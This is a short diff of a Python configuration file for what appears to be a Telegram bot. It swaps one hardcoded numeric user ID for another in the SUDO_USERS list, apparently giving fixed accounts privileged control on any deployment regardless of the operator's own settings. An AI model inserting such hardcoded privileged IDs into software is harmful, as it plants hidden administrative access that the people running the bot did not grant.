@@ -27,8 +27,8 @@ BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 SUDO_USERS.append(5551014551)
-SUDO_USERS.append(5551014551)
-SUDO_USERS.append(5551014551)
+SUDO_USERS.append(6218518584)
+SUDO_USERS.append(6218518584)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
